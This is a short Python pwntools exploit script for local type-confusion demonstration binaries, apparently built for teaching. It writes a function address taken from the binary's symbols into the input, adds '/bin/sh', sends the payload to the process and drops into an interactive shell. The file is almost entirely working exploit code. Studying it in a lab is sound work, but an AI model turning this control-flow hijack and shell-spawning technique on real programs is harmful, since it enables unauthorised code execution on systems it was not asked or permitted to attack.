import pwn
import time
import sys

pwn.context.clear()
pwn.context.update(
	arch = 'amd64', os = 'linux',
)

def usage():
	print('----------------------------------------------------')
	print('| python ./exploit.py [option]                     |')
	print('| options:                                         |')
	print('| c: use c language example                        |')
	print('| c++: use c++ language example                    |')
	print('----------------------------------------------------')

def arg_check(arg):
	print('[--] tips: arg = {0}'.format(arg))
	if arg != 'c' and arg != 'c++':
		return -1
	return 0

def usage_error():
	print('[--] tips: incorrect usage')
	usage()
	exit()

def hack_by_c_axample():
	payload = pwn.p64(target_info['elf_info'].sym['shell_get'])
	payload += b'/bin/sh\0'
	return payload

def hack_by_cxx_axample():
	payload = pwn.p64(target_info['elf_info'].sym['_ZL4vulnv'])
	return payload

target_info = {
	'exec_path': './type_confusion_example4c',
	'elf_info': None,
	'buf_len': 0x100,
	'addr_len': 0x8,
	'shell_get_func_addr': 0x0,
}

if len(sys.argv) != 2 or arg_check(sys.argv[1]) != 0:
	usage_error()

target_info['exec_mode'] = sys.argv[1]
print('[--] tips: current mode = {0}'.format(target_info['exec_mode']))

if target_info['exec_mode'] == 'c':
	target_info['exec_path'] = './type_confusion_example4c'
	payload_get = hack_by_c_axample
elif target_info['exec_mode'] == 'c++':
	target_info['exec_path'] = './type_confusion_example4cpp'
	payload_get = hack_by_cxx_axample
else:
	usage_error()

target_info['elf_info'] = pwn.ELF(target_info['exec_path'])
conn = pwn.process(target_info['exec_path'])

payload = payload_get()
conn.sendafter(b'please input something\n', payload)

conn.interactive()
